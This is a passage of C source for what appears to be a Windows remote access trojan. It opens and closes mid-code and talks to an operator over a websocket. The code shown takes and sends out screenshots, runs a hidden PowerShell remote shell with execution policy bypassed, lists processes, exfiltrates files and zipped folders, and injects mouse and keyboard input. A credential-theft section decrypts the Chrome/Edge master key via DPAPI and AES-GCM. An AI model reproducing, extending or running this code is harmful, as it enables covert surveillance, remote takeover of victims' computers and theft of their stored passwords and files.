        memmove(recv_buffer, recv_buffer + consumed, recv_buffer_len - consumed);
        recv_buffer_len -= consumed;
        buffer[output_len] = '\0';  // Ensure null termination
        return output_len;
    }
    
    return 0;
}

// Reset recv buffer (call when reconnecting)
void reset_recv_buffer() {
    // Force reset of static variables by calling with invalid socket
    // This is a workaround - we'll handle it differently
}

void take_screenshot() {
    send_websocket_data("[*] Capturing screenshot...\n", 28);
    
    // Make process DPI aware to get actual screen resolution
    SetProcessDPIAware();
    
    // Get primary monitor dimensions (most reliable)
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    
    char size_msg[128];
    sprintf(size_msg, "[*] Screen size: %dx%d\n", width, height);
    send_websocket_data(size_msg, strlen(size_msg));
    
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hBitmap);
    
    // Capture full screen at full resolution
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
    
    BITMAPINFOHEADER bi;
    ZeroMemory(&bi, sizeof(BITMAPINFOHEADER));
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height;  // Negative for top-down
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    
    DWORD dwBmpSize = ((width * 3 + 3) & ~3) * height;
    BYTE* pixels = (BYTE*)malloc(dwBmpSize);
    
    if (!pixels) {
        send_websocket_data("[!] Memory error\n", 17);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return;
    }
    
    GetDIBits(hdcScreen, hBitmap, 0, height, pixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    
    // Convert BGR to RGB
    for (DWORD i = 0; i < dwBmpSize; i += 3) {
        BYTE temp = pixels[i];
        pixels[i] = pixels[i + 2];
        pixels[i + 2] = temp;
    }
    
    // Base64 encode the data for reliable transfer through Cloudflare
    DWORD b64_size = ((dwBmpSize + 2) / 3) * 4 + 1;
    char* b64_data = (char*)malloc(b64_size);
    
    if (!b64_data) {
        send_websocket_data("[!] Memory error\n", 17);
        free(pixels);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return;
    }
    
    base64_encode(pixels, dwBmpSize, b64_data);
    free(pixels);  // Don't need raw pixels anymore
    
    DWORD b64_len = strlen(b64_data);
    
    // Send header with dimensions
    char header[256];
    sprintf(header, "<<<SCREENSHOT_START>>>%d|%d|%lu<<<DATA_START>>>", width, height, dwBmpSize);
    if (!send_websocket_data(header, strlen(header))) {
        send_websocket_data("[!] Failed to send header\n", 26);
        free(b64_data);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return;
    }
    
    Sleep(100);
    
    // Send base64 data in chunks
    DWORD sent = 0;
    DWORD chunk_size = 1024;  // 1KB chunks of base64 text
    int error = 0;
    
    while (sent < b64_len && !error && g_connected) {
        DWORD to_send = (b64_len - sent < chunk_size) ? (b64_len - sent) : chunk_size;
        if (!send_websocket_data(b64_data + sent, to_send)) {
            error = 1;
            break;
        }
        sent += to_send;
        
        // Delay every 16KB of base64 data
        if ((sent % 16384) < chunk_size) {
            Sleep(30);
            send_websocket_ping();
        }
    }
    
    free(b64_data);
    
    if (!error && g_connected) {
        Sleep(150);
        send_websocket_data("<<<SCREENSHOT_END>>>", 20);
        Sleep(50);
        
        char msg[128];
        sprintf(msg, "\n[+] Screenshot sent: %dx%d (%lu bytes)\n", width, height, dwBmpSize);
        send_websocket_data(msg, strlen(msg));
    } else {
        send_websocket_data("\n[!] Screenshot transfer failed\n", 33);
    }
    
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}

void shell_session() {
    send_websocket_data("[*] PowerShell mode. Type 'exit' to return.\n", 44);
    
    // Send initial prompt once
    char prompt[512];
    sprintf(prompt, "shell:%s> ", g_current_dir);
    send_websocket_data(prompt, strlen(prompt));
    
    int sent_prompt = 1;  // Track if we've sent prompt
    
    while (g_connected && !g_should_exit) {
        // Ping occasionally
        static DWORD last_ping = 0;
        if (GetTickCount() - last_ping > 10000) {
            send_websocket_ping();
            last_ping = GetTickCount();
        }
        
        // Wait for command
        char ws_buffer[4096];
        memset(ws_buffer, 0, sizeof(ws_buffer));
        int len = recv_websocket_data(ws_buffer, sizeof(ws_buffer) - 1);
        
        if (len < 0) break;
        if (len == 0) {
            Sleep(100);
            continue;
        }
        
        ws_buffer[len] = '\0';
        
        // Clean command
        char cmd[4096];
        char* p = ws_buffer;
        while (*p == ' ' || *p == '\t') p++;
        strncpy(cmd, p, sizeof(cmd) - 1);
        cmd[sizeof(cmd) - 1] = '\0';
        int clen = strlen(cmd);
        while (clen > 0 && (cmd[clen-1] == '\r' || cmd[clen-1] == '\n' ||
                           cmd[clen-1] == ' ' || cmd[clen-1] == '\t')) {
            cmd[--clen] = '\0';
        }
        
        if (clen == 0) {
            // Empty command - just resend prompt
            if (!sent_prompt) {
                sprintf(prompt, "shell:%s> ", g_current_dir);
                send_websocket_data(prompt, strlen(prompt));
                sent_prompt = 1;
            }
            continue;
        }
        
        sent_prompt = 0;  // Will need to send prompt after command
        
        // Exit shell mode
        if (strcmp(cmd, "exit") == 0) {
            send_websocket_data("[*] Shell closed\n", 17);
            break;
        }
        
        // Handle drive change (e.g., "D:" or "d:")
        if (clen == 2 && cmd[1] == ':') {
            char drive_path[4] = {cmd[0], ':', '\\', '\0'};
            if (SetCurrentDirectoryA(drive_path)) {
                GetCurrentDirectoryA(MAX_PATH, g_current_dir);
                char msg[256];
                sprintf(msg, "[+] Changed to drive %c:\n", cmd[0]);
                send_websocket_data(msg, strlen(msg));
            } else {
                char msg[256];
                sprintf(msg, "[!] Cannot access drive %c:\n", cmd[0]);
                send_websocket_data(msg, strlen(msg));
            }
            sprintf(prompt, "shell:%s> ", g_current_dir);
            send_websocket_data(prompt, strlen(prompt));
            sent_prompt = 1;
            continue;
        }
        
        // Handle cd specially with proper path handling
        if (strncmp(cmd, "cd ", 3) == 0 || strncmp(cmd, "cd\\", 3) == 0) {
            char* path = cmd + 3;
            while (*path == ' ') path++;
            
            // Handle quoted paths
            char clean_path[MAX_PATH];
            if (path[0] == '"') {
                path++;
                char* end = strchr(path, '"');
                if (end) *end = '\0';
            }
            strncpy(clean_path, path, MAX_PATH - 1);
            clean_path[MAX_PATH - 1] = '\0';
            
            if (SetCurrentDirectoryA(clean_path)) {
                GetCurrentDirectoryA(MAX_PATH, g_current_dir);
            } else {
                char msg[512];
                sprintf(msg, "[!] Directory not found: %s\n", clean_path);
                send_websocket_data(msg, strlen(msg));
            }
            sprintf(prompt, "shell:%s> ", g_current_dir);
            send_websocket_data(prompt, strlen(prompt));
            sent_prompt = 1;
            continue;
        }
        
        if (strcmp(cmd, "cd") == 0) {
            send_websocket_data(g_current_dir, strlen(g_current_dir));
            send_websocket_data("\n", 1);
            sprintf(prompt, "shell:%s> ", g_current_dir);
            send_websocket_data(prompt, strlen(prompt));
            sent_prompt = 1;
            continue;
        }
        
        // Execute command via PowerShell with hidden window
        // Use CreateProcess to avoid visible window
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa.bInheritHandle = TRUE;
        sa.lpSecurityDescriptor = NULL;
        
        HANDLE hReadPipe, hWritePipe;
        if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
            send_websocket_data("[!] Failed to create pipe\n", 26);
            sprintf(prompt, "shell:%s> ", g_current_dir);
            send_websocket_data(prompt, strlen(prompt));
            sent_prompt = 1;
            continue;
        }
        
        SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
        
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.hStdOutput = hWritePipe;
        si.hStdError = hWritePipe;
        si.wShowWindow = SW_HIDE;
        ZeroMemory(&pi, sizeof(pi));
        
        // Build PowerShell command with proper escaping for special chars
        // Quote the current directory to handle spaces and special chars like &
        char full_cmd[8192];
        sprintf(full_cmd, 
            "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \""
            "Set-Location -LiteralPath '%s'; %s\"",
            g_current_dir, cmd);
        
        if (CreateProcessA(NULL, full_cmd, NULL, NULL, TRUE, 
                          CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(hWritePipe);
            
            char buffer[4096];
            DWORD bytesRead;
            
            while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                send_websocket_data(buffer, bytesRead);
            }
            
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            CloseHandle(hReadPipe);
        } else {
            CloseHandle(hWritePipe);
            CloseHandle(hReadPipe);
            send_websocket_data("[!] Failed to execute\n", 22);
        }
        
        // Update current dir in case command changed it
        GetCurrentDirectoryA(MAX_PATH, g_current_dir);
        
        // Send prompt after command output
        sprintf(prompt, "shell:%s> ", g_current_dir);
        send_websocket_data(prompt, strlen(prompt));
        sent_prompt = 1;
    }
}

void list_processes() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        send_websocket_data("[!] Snapshot failed\n", 20);
        return;
    }
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    
    char header[128];
    sprintf(header, "\n%-8s %-8s %s\n", "PID", "PPID", "Name");
    send_websocket_data(header, strlen(header));
    send_websocket_data("----------------------------------------\n", 41);
    
    if (Process32First(hSnapshot, &pe)) {
        do {
            char line[256];
            sprintf(line, "%-8d %-8d %s\n", 
                    pe.th32ProcessID, 
                    pe.th32ParentProcessID, 
                    pe.szExeFile);
            send_websocket_data(line, strlen(line));
        } while (Process32Next(hSnapshot, &pe));
    }
    
    CloseHandle(hSnapshot);
    send_websocket_data("\n", 1);
}

void download_file(const char* filename) {
    // Strip leading/trailing whitespace from filename
    char clean_name[MAX_PATH];
    const char* start = filename;
    while (*start == ' ' || *start == '\t') start++;
    strncpy(clean_name, start, sizeof(clean_name) - 1);
    clean_name[sizeof(clean_name) - 1] = '\0';
    int len = strlen(clean_name);
    while (len > 0 && (clean_name[len-1] == ' ' || clean_name[len-1] == '\t' ||
                       clean_name[len-1] == '\r' || clean_name[len-1] == '\n')) {
        clean_name[--len] = '\0';
    }
    
    // Try to open the file
    FILE* file = fopen(clean_name, "rb");
    if (!file) {
        // Try with current directory
        char full_path[MAX_PATH];
        sprintf(full_path, "%s\\%s", g_current_dir, clean_name);
        file = fopen(full_path, "rb");
        if (!file) {
            char err_msg[512];
            sprintf(err_msg, "[!] File not found: %s\n", clean_name);
            send_websocket_data(err_msg, strlen(err_msg));
            return;
        }
    }
    
    fseek(file, 0, SEEK_END);
    long long size = _ftelli64(file);  // Use 64-bit for large files
    fseek(file, 0, SEEK_SET);
    
    char size_msg[256];
    sprintf(size_msg, "[*] Downloading: %s (%lld bytes)\n", clean_name, size);
    send_websocket_data(size_msg, strlen(size_msg));
    
    if (size > 100000000) {  // 100MB warning
        send_websocket_data("[!] Large file - this may take a while...\n", 42);
    }
    Sleep(100);
    
    // Send header with filename and size
    char* base_name = strrchr(clean_name, '\\');
    if (!base_name) base_name = strrchr(clean_name, '/');
    if (base_name) base_name++; else base_name = clean_name;
    
    char header[512];
    sprintf(header, "<<<FILE_START>>>%s|%lld<<<NAME_END>>>", base_name, size);
    if (!send_websocket_data(header, strlen(header))) {
        fclose(file);
        return;
    }
    Sleep(100);
    
    // Stream file in chunks - read, encode, send (don't load entire file)
    unsigned char read_buffer[3072];  // Read 3KB at a time (becomes 4KB base64)
    char b64_buffer[4100];  // Base64 output buffer
    long long total_sent = 0;
    int chunk_count = 0;
    
    while (!feof(file) && g_connected) {
        size_t bytes_read = fread(read_buffer, 1, sizeof(read_buffer), file);
        if (bytes_read == 0) break;
        
        // Base64 encode this chunk
        base64_encode(read_buffer, bytes_read, b64_buffer);
        int b64_len = strlen(b64_buffer);
        
        // Send the base64 chunk
        if (!send_websocket_data(b64_buffer, b64_len)) {
            send_websocket_data("\n[!] Transfer failed\n", 21);
            fclose(file);
            return;
        }
        
        total_sent += bytes_read;
        chunk_count++;
        
        // Delay every 16 chunks (~48KB) to prevent buffer overflow
        if (chunk_count % 16 == 0) {
            Sleep(50);
            send_websocket_ping();
        }
    }
    
    fclose(file);
    
    Sleep(150);
    send_websocket_data("<<<FILE_END>>>", 14);
    
    char done_msg[128];
    sprintf(done_msg, "\n[+] Download complete: %lld bytes sent\n", total_sent);
    send_websocket_data(done_msg, strlen(done_msg));
}

void execute_command(const char* cmd) {
    char buffer[4096];
    FILE* pipe = _popen(cmd, "r");
    if (!pipe) {
        send_websocket_data("[!] Failed to execute\n", 22);
        return;
    }
    
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        send_websocket_data(buffer, strlen(buffer));
    }
    
    _pclose(pipe);
    send_websocket_data("\n", 1);
}

// ============== MOUSE & KEYBOARD CONTROL ==============
void mouse_move(int x, int y) {
    // Get screen dimensions for absolute positioning
    int screen_width = GetSystemMetrics(SM_CXSCREEN);
    int screen_height = GetSystemMetrics(SM_CYSCREEN);
    
    // Convert to absolute coordinates (0-65535 range)
    int abs_x = (x * 65535) / screen_width;
    int abs_y = (y * 65535) / screen_height;
    
    INPUT input;
    input.type = INPUT_MOUSE;
    input.mi.dx = abs_x;
    input.mi.dy = abs_y;
    input.mi.mouseData = 0;
    input.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;
    input.mi.time = 0;
    input.mi.dwExtraInfo = 0;
    
    SendInput(1, &input, sizeof(INPUT));
    
    char msg[64];
    sprintf(msg, "[+] Mouse moved to (%d, %d)\n", x, y);
    send_websocket_data(msg, strlen(msg));
}

void mouse_click(int button) {
    INPUT inputs[2];
    ZeroMemory(inputs, sizeof(inputs));
    
    inputs[0].type = INPUT_MOUSE;
    inputs[1].type = INPUT_MOUSE;
    
    if (button == 0) {  // Left click
        inputs[0].mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
        inputs[1].mi.dwFlags = MOUSEEVENTF_LEFTUP;
    } else if (button == 1) {  // Right click
        inputs[0].mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
        inputs[1].mi.dwFlags = MOUSEEVENTF_RIGHTUP;
    } else if (button == 2) {  // Middle click
        inputs[0].mi.dwFlags = MOUSEEVENTF_MIDDLEDOWN;
        inputs[1].mi.dwFlags = MOUSEEVENTF_MIDDLEUP;
    } else {
        return;
    }
    
    SendInput(2, inputs, sizeof(INPUT));
    
    const char* btn_name = (button == 0) ? "left" : (button == 1) ? "right" : "middle";
    char msg[64];
    sprintf(msg, "[+] Mouse %s click\n", btn_name);
    send_websocket_data(msg, strlen(msg));
}

void send_keys(const char* keys) {
    // Send keystrokes - supports special keys in brackets like [ENTER], [TAB], etc.
    int len = strlen(keys);
    
    for (int i = 0; i < len; i++) {
        // Check for special keys
        if (keys[i] == '[') {
            char special[32] = {0};
            int j = 0;
            i++;
            while (i < len && keys[i] != ']' && j < 30) {
                special[j++] = keys[i++];
            }
            special[j] = '\0';
            
            WORD vk = 0;
            if (_stricmp(special, "ENTER") == 0 || _stricmp(special, "RETURN") == 0) vk = VK_RETURN;
            else if (_stricmp(special, "TAB") == 0) vk = VK_TAB;
            else if (_stricmp(special, "ESC") == 0 || _stricmp(special, "ESCAPE") == 0) vk = VK_ESCAPE;
            else if (_stricmp(special, "BACKSPACE") == 0 || _stricmp(special, "BS") == 0) vk = VK_BACK;
            else if (_stricmp(special, "DELETE") == 0 || _stricmp(special, "DEL") == 0) vk = VK_DELETE;
            else if (_stricmp(special, "UP") == 0) vk = VK_UP;
            else if (_stricmp(special, "DOWN") == 0) vk = VK_DOWN;
            else if (_stricmp(special, "LEFT") == 0) vk = VK_LEFT;
            else if (_stricmp(special, "RIGHT") == 0) vk = VK_RIGHT;
            else if (_stricmp(special, "HOME") == 0) vk = VK_HOME;
            else if (_stricmp(special, "END") == 0) vk = VK_END;
            else if (_stricmp(special, "PGUP") == 0) vk = VK_PRIOR;
            else if (_stricmp(special, "PGDN") == 0) vk = VK_NEXT;
            else if (_stricmp(special, "F1") == 0) vk = VK_F1;
            else if (_stricmp(special, "F2") == 0) vk = VK_F2;
            else if (_stricmp(special, "F3") == 0) vk = VK_F3;
            else if (_stricmp(special, "F4") == 0) vk = VK_F4;
            else if (_stricmp(special, "F5") == 0) vk = VK_F5;
            else if (_stricmp(special, "F6") == 0) vk = VK_F6;
            else if (_stricmp(special, "F7") == 0) vk = VK_F7;
            else if (_stricmp(special, "F8") == 0) vk = VK_F8;
            else if (_stricmp(special, "F9") == 0) vk = VK_F9;
            else if (_stricmp(special, "F10") == 0) vk = VK_F10;
            else if (_stricmp(special, "F11") == 0) vk = VK_F11;
            else if (_stricmp(special, "F12") == 0) vk = VK_F12;
            else if (_stricmp(special, "CTRL") == 0) vk = VK_CONTROL;
            else if (_stricmp(special, "ALT") == 0) vk = VK_MENU;
            else if (_stricmp(special, "SHIFT") == 0) vk = VK_SHIFT;
            else if (_stricmp(special, "WIN") == 0) vk = VK_LWIN;
            else if (_stricmp(special, "SPACE") == 0) vk = VK_SPACE;
            else if (_stricmp(special, "CAPSLOCK") == 0) vk = VK_CAPITAL;
            else if (_stricmp(special, "NUMLOCK") == 0) vk = VK_NUMLOCK;
            else if (_stricmp(special, "PRINTSCREEN") == 0) vk = VK_SNAPSHOT;
            else if (_stricmp(special, "INSERT") == 0) vk = VK_INSERT;
            
            if (vk != 0) {
                INPUT inputs[2];
                inputs[0].type = INPUT_KEYBOARD;
                inputs[0].ki.wVk = vk;
                inputs[0].ki.dwFlags = 0;
                inputs[0].ki.time = 0;
                inputs[0].ki.dwExtraInfo = 0;
                inputs[0].ki.wScan = 0;
                
                inputs[1].type = INPUT_KEYBOARD;
                inputs[1].ki.wVk = vk;
                inputs[1].ki.dwFlags = KEYEVENTF_KEYUP;
                inputs[1].ki.time = 0;
                inputs[1].ki.dwExtraInfo = 0;
                inputs[1].ki.wScan = 0;
                
                SendInput(2, inputs, sizeof(INPUT));
                Sleep(10);
            }
        } else {
            // Regular character - use VkKeyScan for proper key mapping
            SHORT vk_result = VkKeyScanA(keys[i]);
            BYTE vk = LOBYTE(vk_result);
            BYTE shift_state = HIBYTE(vk_result);
            
            INPUT inputs[4];
            int input_count = 0;
            
            // Press shift if needed
            if (shift_state & 1) {
                inputs[input_count].type = INPUT_KEYBOARD;
                inputs[input_count].ki.wVk = VK_SHIFT;
                inputs[input_count].ki.dwFlags = 0;
                inputs[input_count].ki.time = 0;
                inputs[input_count].ki.dwExtraInfo = 0;
                inputs[input_count].ki.wScan = 0;
                input_count++;
            }
            
            // Key down
            inputs[input_count].type = INPUT_KEYBOARD;
            inputs[input_count].ki.wVk = vk;
            inputs[input_count].ki.dwFlags = 0;
            inputs[input_count].ki.time = 0;
            inputs[input_count].ki.dwExtraInfo = 0;
            inputs[input_count].ki.wScan = 0;
            input_count++;
            
            // Key up
            inputs[input_count].type = INPUT_KEYBOARD;
            inputs[input_count].ki.wVk = vk;
            inputs[input_count].ki.dwFlags = KEYEVENTF_KEYUP;
            inputs[input_count].ki.time = 0;
            inputs[input_count].ki.dwExtraInfo = 0;
            inputs[input_count].ki.wScan = 0;
            input_count++;
            
            // Release shift if needed
            if (shift_state & 1) {
                inputs[input_count].type = INPUT_KEYBOARD;
                inputs[input_count].ki.wVk = VK_SHIFT;
                inputs[input_count].ki.dwFlags = KEYEVENTF_KEYUP;
                inputs[input_count].ki.time = 0;
                inputs[input_count].ki.dwExtraInfo = 0;
                inputs[input_count].ki.wScan = 0;
                input_count++;
            }
            
            SendInput(input_count, inputs, sizeof(INPUT));
            Sleep(10);
        }
    }
    
    char msg[128];
    sprintf(msg, "[+] Sent %d characters\n", len);
    send_websocket_data(msg, strlen(msg));
}

// ============== FOLDER DOWNLOAD ==============
void download_folder(const char* foldername) {
    char clean_name[MAX_PATH];
    const char* start = foldername;
    while (*start == ' ' || *start == '\t') start++;
    strncpy(clean_name, start, sizeof(clean_name) - 1);
    clean_name[sizeof(clean_name) - 1] = '\0';
    int len = strlen(clean_name);
    while (len > 0 && (clean_name[len-1] == ' ' || clean_name[len-1] == '\t' ||
                       clean_name[len-1] == '\\' || clean_name[len-1] == '/')) {
        clean_name[--len] = '\0';
    }
    
    // Check if folder exists
    DWORD attrs = GetFileAttributesA(clean_name);
    if (attrs == INVALID_FILE_ATTRIBUTES || !(attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        send_websocket_data("[!] Folder not found\n", 21);
        return;
    }
    
    // Create a temporary zip file using PowerShell
    char temp_zip[MAX_PATH];
    char temp_dir[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_dir);
    sprintf(temp_zip, "%sfolder_%d.zip", temp_dir, GetTickCount());
    
    send_websocket_data("[*] Compressing folder...\n", 26);
    
    // Use PowerShell to compress
    char ps_cmd[4096];
    sprintf(ps_cmd, 
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \""
        "Compress-Archive -Path '%s\\*' -DestinationPath '%s' -Force\"",
        clean_name, temp_zip);
    
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));
    
    if (CreateProcessA(NULL, ps_cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 300000);  // Wait up to 5 min
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    // Check if zip was created
    if (GetFileAttributesA(temp_zip) == INVALID_FILE_ATTRIBUTES) {
        send_websocket_data("[!] Failed to compress folder\n", 30);
        return;
    }
    
    // Download the zip file
    download_file(temp_zip);
    
    // Delete temp zip
    DeleteFileA(temp_zip);
}

// Helper function to copy files that may be locked by reading and writing
int copy_file_safe(const char* src, const char* dst) {
    HANDLE hSrcFile = CreateFileA(src, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hSrcFile == INVALID_HANDLE_VALUE) {
        return 0;  // Source file doesn't exist or is locked
    }
    
    HANDLE hDstFile = CreateFileA(dst, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDstFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hSrcFile);
        return 0;  // Cannot create destination
    }
    
    BYTE buffer[65536];
    DWORD bytes_read, bytes_written;
    int success = 1;
    
    while (ReadFile(hSrcFile, buffer, sizeof(buffer), &bytes_read, NULL) && bytes_read > 0) {
        if (!WriteFile(hDstFile, buffer, bytes_read, &bytes_written, NULL) || bytes_written != bytes_read) {
            success = 0;
            break;
        }
    }
    
    CloseHandle(hSrcFile);
    CloseHandle(hDstFile);
    return success;
}

// ============== BROWSER CREDENTIAL EXTRACTION ==============

// Base64 decode helper
static int b64_decode_char(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static int b64_decode(const char* input, BYTE* output, int max_out) {
    int len = strlen(input);
    int out_len = 0;
    int val = 0, bits = 0;
    
    for (int i = 0; i < len && out_len < max_out; i++) {
        if (input[i] == '=' || input[i] == '\r' || input[i] == '\n') continue;
        int d = b64_decode_char(input[i]);
        if (d < 0) continue;
        val = (val << 6) | d;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            output[out_len++] = (val >> bits) & 0xFF;
        }
    }
    return out_len;
}

// Get Chrome/Edge master key using DPAPI
static BYTE* get_chromium_master_key(const char* local_state_path, int* key_len) {
    *key_len = 0;
    
    // Read Local State file
    FILE* f = fopen(local_state_path, "rb");
    if (!f) return NULL;
    
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    if (fsize > 1024 * 1024) { fclose(f); return NULL; }  // Too large
    
    char* json = (char*)malloc(fsize + 1);
    if (!json) { fclose(f); return NULL; }
    
    fread(json, 1, fsize, f);
    json[fsize] = 0;
    fclose(f);
    
    // Find "encrypted_key":"..."
    char* key_start = strstr(json, "\"encrypted_key\":\"");
    if (!key_start) { free(json); return NULL; }
    
    key_start += 17;  // Skip "encrypted_key":"
    char* key_end = strchr(key_start, '"');
    if (!key_end) { free(json); return NULL; }
    
    int b64_len = key_end - key_start;
    char* b64_key = (char*)malloc(b64_len + 1);
    memcpy(b64_key, key_start, b64_len);
    b64_key[b64_len] = 0;
    free(json);
    
    // Base64 decode
    BYTE* enc_key = (BYTE*)malloc(b64_len);
    int enc_len = b64_decode(b64_key, enc_key, b64_len);
    free(b64_key);
    
    if (enc_len < 10) { free(enc_key); return NULL; }
    
    // Remove "DPAPI" prefix (first 5 bytes)
    DATA_BLOB in_blob, out_blob;
    in_blob.pbData = enc_key + 5;
    in_blob.cbData = enc_len - 5;
    
    if (!CryptUnprotectData(&in_blob, NULL, NULL, NULL, NULL, 0, &out_blob)) {
        free(enc_key);
        return NULL;
    }
    free(enc_key);
    
    // Copy to new buffer
    BYTE* master_key = (BYTE*)malloc(out_blob.cbData);
    memcpy(master_key, out_blob.pbData, out_blob.cbData);
    *key_len = out_blob.cbData;
    LocalFree(out_blob.pbData);
    
    return master_key;
}

// AES-256 block encrypt (single block, ECB mode for counter increment)
static int aes_ecb_encrypt_block(BCRYPT_KEY_HANDLE hKey, BYTE* in, BYTE* out) {
    ULONG result_len = 0;
    NTSTATUS status = BCryptEncrypt(hKey, in, 16, NULL, NULL, 0, out, 16, &result_len, 0);
    return BCRYPT_SUCCESS(status) ? 16 : 0;
}

// Increment 128-bit counter (big endian)
static void increment_counter(BYTE* counter) {
    for (int i = 15; i >= 0; i--) {
        if (++counter[i] != 0) break;
    }
}

// AES-GCM decrypt (simplified - decryption only, no tag verification like Python's AES.decrypt())
static int aes_gcm_decrypt(BYTE* key, int key_len, BYTE* iv, int iv_len, 
                           BYTE* ciphertext, int ct_len, BYTE* tag, int tag_len,
                           BYTE* plaintext) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    int result = 0;
    
    if (key_len != 32 || iv_len != 12 || ct_len <= 0) return 0;
    
    // Open algorithm provider - use ECB mode for counter encryption
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return 0;
    
    // Set chaining mode to ECB (for manual CTR operation)
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_ECB, 
                               sizeof(BCRYPT_CHAIN_MODE_ECB), 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return 0; }
    
    // Generate key
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, key_len, 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return 0; }
    
    // Build initial counter block for GCM
    // GCM uses: IV (12 bytes) || 32-bit big-endian counter starting at 1
    // For encryption/decryption of plaintext, counter starts at 2 (counter 1 is for auth tag)
    BYTE counter[16];
    memcpy(counter, iv, 12);
    // Set counter to 2 (big-endian 32-bit)
    counter[12] = 0x00;
    counter[13] = 0x00;
    counter[14] = 0x00;
    counter[15] = 0x02;
    
    BYTE keystream[16];
    int offset = 0;
    
    // Decrypt using CTR mode (GCM uses CTR internally)
    while (offset < ct_len) {
        // Encrypt counter to get keystream block
        ULONG result_len = 0;
        status = BCryptEncrypt(hKey, counter, 16, NULL, NULL, 0, keystream, 16, &result_len, 0);
        if (!BCRYPT_SUCCESS(status) || result_len != 16) break;
        
        // XOR keystream with ciphertext to get plaintext
        int block_size = (ct_len - offset < 16) ? (ct_len - offset) : 16;
        for (int i = 0; i < block_size; i++) {
            plaintext[offset + i] = ciphertext[offset + i] ^ keystream[i];
        }
        
        offset += block_size;
        
        // Increment counter (big-endian)
        for (int i = 15; i >= 12; i--) {
            if (++counter[i] != 0) break;
        }
    }
    
    result = offset;
    
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

// Decrypt Chrome v10/v11 encrypted value
static int decrypt_chromium_value(BYTE* encrypted, int enc_len, BYTE* master_key, int key_len, char* output, int max_out) {
    if (enc_len < 31) return 0;
    
    // Check for v10 or v11 prefix
    if (encrypted[0] == 'v' && encrypted[1] == '1' && (encrypted[2] == '0' || encrypted[2] == '1')) {
        // v10/v11 AES-GCM encryption
        // IV: bytes 3-14 (12 bytes)
        // Ciphertext: bytes 15 to (len-16)
        // Tag: last 16 bytes
        
        BYTE* iv = encrypted + 3;
        int iv_len = 12;
        BYTE* ciphertext = encrypted + 15;
        int ct_len = enc_len - 15 - 16;
        BYTE* tag = encrypted + enc_len - 16;
        
        if (ct_len <= 0 || ct_len >= max_out) return 0;
        
